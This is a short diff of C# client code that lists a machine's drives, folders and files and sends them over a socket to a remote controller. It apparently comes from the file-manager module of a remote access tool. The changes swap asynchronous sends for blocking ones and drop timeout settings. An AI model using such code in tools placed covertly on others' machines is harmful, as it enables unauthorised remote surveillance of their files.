@@ -29,7 +29,7 @@ namespace Client.Handle_Packet
                         sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                     }
                     msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
-                    ClientSocket.BeginSend(msgpack.Encode2Bytes());
+                    ClientSocket.Send(msgpack.Encode2Bytes());
                 }
             }
             catch { }
@@ -59,7 +59,7 @@ namespace Client.Handle_Packet
                 }
                 msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                 msgpack.ForcePathObject("File").AsString = sbFile.ToString();
-                ClientSocket.BeginSend(msgpack.Encode2Bytes());
+                ClientSocket.Send(msgpack.Encode2Bytes());
             }
             catch { }
         }
@@ -95,8 +95,6 @@ namespace Client.Handle_Packet
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
-                    ReceiveTimeout = -1,
-                    SendTimeout = -1,
                 };
                 Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
 
